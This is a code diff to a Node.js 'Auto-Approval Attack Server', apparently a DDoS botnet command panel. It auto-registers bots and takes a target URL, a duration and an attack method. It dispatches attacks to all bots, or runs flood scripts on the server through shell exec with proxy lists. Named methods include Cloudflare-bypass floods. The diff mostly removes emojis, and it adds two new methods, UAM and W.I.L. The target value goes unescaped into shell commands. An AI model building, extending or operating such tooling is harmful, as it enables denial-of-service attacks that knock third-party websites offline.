@@ -15,10 +15,10 @@ async function fetchData() {
     const response = await fetch('https://httpbin.org/get');
     const data = await response.json();
     console.log('\n========================================');
-    console.log('🎮 Auto-Approval Attack Server Started!');
+    console.log('Auto-Approval Attack Server Started!');
     console.log('========================================');
-    console.log(`📍 Local:    http://localhost:${port}`);
-    console.log(`🌐 Network:  http://${data.origin}:${port}`);
+    console.log(`Local:    http://localhost:${port}`);
+    console.log(`Network:  http://${data.origin}:${port}`);
     console.log('========================================\n');
     return data;
   } catch (error) {
@@ -34,7 +34,7 @@ app.get('/', (req, res) => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto-Approval Attack Server</title>
+    <title>RICARDO SERVER</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @keyframes pulse-glow {
@@ -51,7 +51,7 @@ app.get('/', (req, res) => {
             <div class="flex items-center justify-between">
                 <div class="flex items-center gap-3">
                     <div class="w-12 h-12 bg-gradient-to-br from-red-600 to-red-800 rounded-lg flex items-center justify-center pulse-glow">
-                        <span class="text-2xl">⚡</span>
+                        <span class="text-2xl">.</span>
                     </div>
                     <div>
                         <h1 class="text-2xl font-bold bg-gradient-to-r from-red-500 to-purple-600 bg-clip-text text-transparent">
@@ -79,7 +79,7 @@ app.get('/', (req, res) => {
                 <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
                     <div class="bg-gradient-to-r from-green-900/50 to-blue-900/50 px-6 py-4 border-b border-gray-700">
                         <h2 class="text-xl font-bold flex items-center gap-2">
-                            <span>🤖</span> Auto-Approved Bots
+                            Auto-Approved Bots
                             <span class="text-xs bg-green-900 text-green-300 px-2 py-1 rounded ml-2">Auto-Register ON</span>
                         </h2>
                     </div>
@@ -94,7 +94,7 @@ app.get('/', (req, res) => {
                 <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
                     <div class="bg-gradient-to-r from-red-900/50 to-orange-900/50 px-6 py-4 border-b border-gray-700">
                         <h2 class="text-xl font-bold flex items-center gap-2">
-                            <span>🚫</span> Blocked Bots
+                            Blocked Bots
                         </h2>
                     </div>
                     <div class="p-6">
@@ -108,12 +108,12 @@ app.get('/', (req, res) => {
                 <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
                     <div class="bg-gradient-to-r from-red-900/50 to-purple-900/50 px-6 py-4 border-b border-gray-700">
                         <h2 class="text-xl font-bold flex items-center gap-2">
-                            <span>⚔️</span> Launch Attack
+                            Start Attack
                         </h2>
                     </div>
                     <div class="p-6 space-y-4">
                         <div>
-                            <label class="block text-sm font-medium text-gray-300 mb-2">🎯 Target URL</label>
+                            <label class="block text-sm font-medium text-gray-300 mb-2">Target URL</label>
                             <input type="text" id="target" 
                                 class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-red-500 focus:ring-2 focus:ring-red-500/50" 
                                 placeholder="https://example.com">
@@ -121,13 +121,13 @@ app.get('/', (req, res) => {
 
                         <div class="grid grid-cols-2 gap-4">
                             <div>
-                                <label class="block text-sm font-medium text-gray-300 mb-2">⏱️ Duration (seconds)</label>
+                                <label class="block text-sm font-medium text-gray-300 mb-2">Duration (seconds)</label>
                                 <input type="number" id="time" value="60" 
                                     class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-red-500 focus:ring-2 focus:ring-red-500/50" 
                                     min="1">
                             </div>
                             <div>
-                                <label class="block text-sm font-medium text-gray-300 mb-2">💣 Attack Method</label>
+                                <label class="block text-sm font-medium text-gray-300 mb-2">Attack Method</label>
                                 <select id="method" 
                                     class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-red-500 focus:ring-2 focus:ring-red-500/50">
                                     <option>CF-BYPASS</option>
@@ -138,6 +138,8 @@ app.get('/', (req, res) => {
                                     <option>PRIV-TOR</option>
                                     <option>HOLD-PANEL</option>
                                     <option>R1</option>
+                                    <option>UAM</option>
+                                    <option>W.I.L</option>
                                 </select>
                             </div>
                         </div>
@@ -145,16 +147,16 @@ app.get('/', (req, res) => {
                         <div class="flex gap-2">
                             <button onclick="attackAll()" id="attackBtn" 
                                 class="flex-1 bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white font-bold py-4 px-6 rounded-lg transition-all transform hover:scale-105 shadow-lg">
-                                🚀 Attack All Bots
+                                Attack All Bots
                             </button>
                             <button onclick="stopAll()" id="stopBtn" 
                                 class="flex-1 bg-gradient-to-r from-orange-600 to-orange-700 hover:from-orange-700 hover:to-orange-800 text-white font-bold py-4 px-6 rounded-lg transition-all transform hover:scale-105 shadow-lg">
-                                🛑 Stop All Attacks
+                                Stop All Attacks
                             </button>
                         </div>
                         <button onclick="attackServer()" id="serverBtn" 
                             class="w-full bg-gradient-to-r from-purple-600 to-purple-700 hover:from-purple-700 hover:to-purple-800 text-white font-bold py-4 px-6 rounded-lg transition-all transform hover:scale-105 shadow-lg">
-                            ⚡ Attack (Server Only)
+                            Attack (Server Only)
                         </button>
 
                         <div id="status" class="p-4 bg-gray-900 rounded-lg border border-gray-700 hidden">
@@ -167,7 +169,7 @@ app.get('/', (req, res) => {
                 <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
                     <div class="bg-gradient-to-r from-purple-900/50 to-pink-900/50 px-6 py-4 border-b border-gray-700 flex items-center justify-between">
                         <h2 class="text-xl font-bold flex items-center gap-2">
-                            <span>📊</span> Activity Logs
+                            Activity Logs
                         </h2>
                         <button onclick="clearLogs()" 
                             class="text-xs bg-gray-700 hover:bg-gray-600 px-3 py-1 rounded transition-colors">
@@ -186,7 +188,7 @@ app.get('/', (req, res) => {
             <div class="space-y-6">
                 <!-- Stats -->
                 <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl p-6">
-                    <h3 class="text-lg font-bold mb-4">📈 Statistics</h3>
+                    <h3 class="text-lg font-bold mb-4">Statistics</h3>
                     <div class="space-y-3">
                         <div class="flex justify-between items-center">
                             <span class="text-gray-400 text-sm">Total Bots</span>
@@ -209,30 +211,30 @@ app.get('/', (req, res) => {
 
                 <!-- Quick Actions -->
                 <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl p-6">
-                    <h3 class="text-lg font-bold mb-4">⚡ Quick Actions</h3>
+                    <h3 class="text-lg font-bold mb-4">Quick Actions</h3>
                     <div class="space-y-2">
                         <button onclick="refreshBots()" 
                             class="w-full bg-gray-700 hover:bg-gray-600 text-white py-2 px-4 rounded transition-colors text-sm">
-                            🔄 Refresh Bots
+                            Refresh Bots
                         </button>
                         <button onclick="removeAllBots()" 
                             class="w-full bg-red-900/50 hover:bg-red-800/50 text-white py-2 px-4 rounded transition-colors text-sm">
-                            🗑️ Remove All Bots
+                            Remove All Bots
                         </button>
                     </div>
                 </div>
 
                 <!-- Available Methods -->
                 <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl p-6">
-                    <h3 class="text-lg font-bold mb-4">📋 Attack Methods</h3>
+                    <h3 class="text-lg font-bold mb-4">Attack Methods</h3>
                     <div class="space-y-2 text-xs">
                         <div class="bg-gray-900 p-2 rounded border border-lime-900/30">
                             <div class="text-lime-400 font-bold">CF-BYPASS</div>
-                            <div class="text-gray-500 text-xs mt-1">⭐ CloudFlare protection bypass</div>
+                            <div class="text-gray-500 text-xs mt-1">CloudFlare protection bypass</div>
                         </div>
                         <div class="bg-gray-900 p-2 rounded border border-cyan-900/30">
                             <div class="text-cyan-400 font-bold">MODERN-FLOOD</div>
-                            <div class="text-gray-500 text-xs mt-1">⭐ HTTP/2 + vulnerabilities</div>
+                            <div class="text-gray-500 text-xs mt-1">HTTP/2 + vulnerabilities</div>
                         </div>
                         <div class="bg-gray-900 p-2 rounded border border-red-900/30">
                             <div class="text-red-400 font-bold">HTTP-SICARIO</div>
@@ -251,6 +253,14 @@ app.get('/', (req, res) => {
                         </div>
                         <div class="bg-gray-900 p-2 rounded border border-purple-900/30">
                             <div class="text-purple-400 font-bold">R1</div>
+                        </div>
+                        <div class="bg-gray-900 p-2 rounded border border-indigo-900/30">
+                            <div class="text-indigo-400 font-bold">UAM</div>
+                            <div class="text-gray-500 text-xs mt-1">Advanced CF bypass with puppeteer</div>
+                        </div>
+                        <div class="bg-gray-900 p-2 rounded border border-pink-900/30">
+                            <div class="text-pink-400 font-bold">W.I.L</div>
+                            <div class="text-gray-500 text-xs mt-1">Web Intensive Load - Ultimate power</div>
                         </div>
                     </div>
                 </div>
@@ -375,12 +385,12 @@ app.get('/', (req, res) => {
                     renderBots();
                     updateStats();
                     refreshBlockedBots();
-                    addLog(\`✅ Bot permanently blocked: \${bot.url}\`, 'success');
+                    addLog(\`Bot permanently blocked: \${bot.url}\`, 'success');
                 } else {
-                    addLog(\`❌ Failed to block bot: \${data.error}\`, 'error');
+                    addLog(\`Failed to block bot: \${data.error}\`, 'error');
                 }
             } catch (error) {
-                addLog(\`❌ Error blocking bot: \${error.message}\`, 'error');
+                addLog(\`Error blocking bot: \${error.message}\`, 'error');
             }
         }
 
@@ -395,12 +405,12 @@ app.get('/', (req, res) => {
                 
                 if (data.success) {
                     refreshBlockedBots();
-                    addLog(\`✅ Bot unblocked: \${botUrl}\`, 'success');
+                    addLog(\`Bot unblocked: \${botUrl}\`, 'success');
                 } else {
-                    addLog(\`❌ Failed to unblock bot: \${data.error}\`, 'error');
+                    addLog(\`Failed to unblock bot: \${data.error}\`, 'error');
                 }
             } catch (error) {
-                addLog(\`❌ Error unblocking bot: \${error.message}\`, 'error');
+                addLog(\`Error unblocking bot: \${error.message}\`, 'error');
             }
         }
 
@@ -442,24 +452,24 @@ app.get('/', (req, res) => {
             const method = document.getElementById('method').value;
 
             if (!target || !time) {
-                addLog('❌ Error: Target and time required', 'error');
+                addLog('Error: Target and time required', 'error');
                 return;
             }
 
             if (bots.length === 0) {
-                addLog('❌ Error: No bots connected', 'error');
+                addLog('Error: No bots connected', 'error');
                 return;
             }
 
             const btn = document.getElementById('attackBtn');
             btn.disabled = true;
-            btn.textContent = '⏳ Launching...';
+            btn.textContent = 'Launching...';
             
             activeAttacks++;
             totalAttacks++;
             updateStats();
 
-            addLog(\`🚀 Launching \${method} to \${bots.length} bots\`, 'info');
+            addLog(\`Launching \${method} to \${bots.length} bots\`, 'info');
             addLog(\`Target: \${target} | Duration: \${time}s\`, 'info');
 
             let successCount = 0;
@@ -472,14 +482,14 @@ app.get('/', (req, res) => {
                     
                     if (data.success) {
                         successCount++;
-                        addLog(\`✅ \${bot.url} - Attack launched\`, 'success');
+                        addLog(\`\${bot.url} - Attack launched\`, 'success');
                     } else {
                         failCount++;
-                        addLog(\`❌ \${bot.url} - Failed\`, 'error');
+                        addLog(\`\${bot.url} - Failed\`, 'error');
                     }
                 } catch (error) {
                     failCount++;
-                    addLog(\`❌ \${bot.url} - Network error\`, 'error');
+                    addLog(\`\${bot.url} - Network error\`, 'error');
                 }
             }
 
@@ -491,32 +501,32 @@ app.get('/', (req, res) => {
             }, parseInt(time) * 1000);
 
             btn.disabled = false;
-            btn.textContent = '🚀 Attack All Bots';
+            btn.textContent = 'Attack All Bots';
         }
 
         async function stopAll() {
             const btn = document.getElementById('stopBtn');
             btn.disabled = true;
-            btn.textContent = '⏳ Stopping...';
+            btn.textContent = 'Stopping...';
 
-            addLog('🛑 Sending stop command to all bots', 'info');
+            addLog('Sending stop command to all bots', 'info');
 
             try {
                 const response = await fetch('/stop-all');
                 const data = await response.json();
                 
                 if (data.success) {
-                    addLog(\`✅ Stop command sent: \${data.message}\`, 'success');
+                    addLog(\`Stop command sent: \${data.message}\`, 'success');
                     activeAttacks = 0;
                     updateStats();
                 } else {
-                    addLog('❌ Failed to send stop command', 'error');
+                    addLog('Failed to send stop command', 'error');
                 }
             } catch (error) {
-                addLog(\`❌ Error: \${error.message}\`, 'error');
+                addLog(\`Error: \${error.message}\`, 'error');
             } finally {
                 btn.disabled = false;
-                btn.textContent = '🛑 Stop All Attacks';
+                btn.textContent = 'Stop All Attacks';
             }
         }
 
@@ -526,7 +536,7 @@ app.get('/', (req, res) => {
             const method = document.getElementById('method').value;
 
             if (!target || !time) {
-                addLog('❌ Error: Target and time required', 'error');
+                addLog('Error: Target and time required', 'error');
                 return;
             }
 
@@ -534,23 +544,23 @@ app.get('/', (req, res) => {
             const status = document.getElementById('status');
             
             btn.disabled = true;
-            btn.textContent = '⏳ Executing...';
+            btn.textContent = 'Executing...';
             
             activeAttacks++;
             totalAttacks++;
             updateStats();
 
-            addLog(\`⚡ Server executing \${method} attack on \${target}\`, 'info');
+            addLog(\`Server executing \${method} attack on \${target}\`, 'info');
 
             try {
                 const response = await fetch(\`/attack?target=\${encodeURIComponent(target)}&time=\${time}&methods=\${method}\`);
                 const data = await response.json();
                 
                 if (response.ok) {
-                    addLog(\`✅ Server attack launched!\`, 'success');
+                    addLog(\`Server attack launched!\`, 'success');
                     status.classList.remove('hidden');
                     status.querySelector('p').innerHTML = \`
-                        <strong class="text-red-400">🔥 Server Active:</strong> 
+                        <strong class="text-red-400">Server Active:</strong> 
                         <span class="text-white">\${target}</span> | 
                         <span class="text-yellow-400">\${method}</span> | 
                         <span class="text-green-400">\${time}s</span>
@@ -561,24 +571,24 @@ app.get('/', (req, res) => {
                         updateStats();
                     }, parseInt(time) * 1000);
                 } else {
-                    addLog(\`❌ Error: Server attack failed\`, 'error');
+                    addLog(\`Error: Server attack failed\`, 'error');
                     activeAttacks = Math.max(0, activeAttacks - 1);
                     updateStats();
                 }
             } catch (error) {
-                addLog(\`❌ Network Error: \${error.message}\`, 'error');
+                addLog(\`Network Error: \${error.message}\`, 'error');
                 activeAttacks = Math.max(0, activeAttacks - 1);
                 updateStats();
             } finally {
                 btn.disabled = false;
-                btn.textContent = '⚡ Attack (Server Only)';
+                btn.textContent = 'Attack (Server Only)';
             }
         }
 
         function addLog(message, type = 'info') {
             const logsDiv = document.getElementById('logs');
             const timestamp = new Date().toLocaleTimeString();
-            const icons = { info: '🔵', success: '✅', error: '❌' };
+            const icons = { info: '[INFO]', success: '[OK]', error: '[ERROR]' };
             const colors = { info: 'text-blue-400', success: 'text-green-400', error: 'text-red-400' };
             
             if (logsDiv.querySelector('.text-gray-500')) {
@@ -589,7 +599,7 @@ app.get('/', (req, res) => {
             logEntry.className = 'mb-2 pb-2 border-b border-gray-800';
             logEntry.innerHTML = \`
                 <div class="flex items-start gap-2">
-                    <span>\${icons[type]}</span>
+                    <span class="\${colors[type]}">\${icons[type]}</span>
                     <div class="flex-1">
                         <span class="text-gray-500 text-xs">[\${timestamp}]</span>
                         <span class="\${colors[type]} ml-2">\${message}</span>
@@ -838,27 +848,27 @@ app.get('/attack', (req, res) => {
   };
 
   if (methods === 'CF-BYPASS') {
-    console.log('✅ Executing CF-BYPASS');
+    console.log('[OK] Executing CF-BYPASS');
     execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32 proxy.txt`);
   }
   else if (methods === 'MODERN-FLOOD') {
-    console.log('✅ Executing MODERN-FLOOD');
+    console.log('[OK] Executing MODERN-FLOOD');
     execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64 proxy.txt`);
   }
   else if (methods === 'HTTP-SICARIO') {
-    console.log('✅ Executing HTTP-SICARIO');
+    console.log('[OK] Executing HTTP-SICARIO');
     execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
     execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
     execWithLog(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
     execWithLog(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
   } 
   else if (methods === 'RAW-HTTP') {
-    console.log('✅ Executing RAW-HTTP');
+    console.log('[OK] Executing RAW-HTTP');
     execWithLog(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
     execWithLog(`node methods/http-panel.js ${target} ${time}`);
   } 
   else if (methods === 'R9') {
-    console.log('✅ Executing R9');
+    console.log('[OK] Executing R9');
     execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
     execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
     execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
@@ -866,7 +876,7 @@ app.get('/attack', (req, res) => {
     execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
   } 
   else if (methods === 'PRIV-TOR') {
-    console.log('✅ Executing PRIV-TOR');
+    console.log('[OK] Executing PRIV-TOR');
     execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
     execWithLog(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
     execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
@@ -874,11 +884,11 @@ app.get('/attack', (req, res) => {
     execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
   } 
   else if (methods === 'HOLD-PANEL') {
-    console.log('✅ Executing HOLD-PANEL');
+    console.log('[OK] Executing HOLD-PANEL');
     execWithLog(`node methods/http-panel.js ${target} ${time}`);
   } 
   else if (methods === 'R1') {
-    console.log('✅ Executing R1');
+    console.log('[OK] Executing R1');
     execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
     execWithLog(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
     execWithLog(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
@@ -887,6 +897,14 @@ app.get('/attack', (req, res) => {
     execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
     execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
     execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
+  }
+  else if (methods === 'UAM') {
+    console.log('[OK] Executing UAM');
+    execWithLog(`node methods/uam.js ${target} ${time} 5 4 6`);
+  }
+  else if (methods === 'W.I.L') {
+    console.log('[OK] Executing W.I.L - Web Intensive Load');
+    execWithLog(`node methods/wil.js ${target} ${time} 10 8 4`);
   }
 });
 
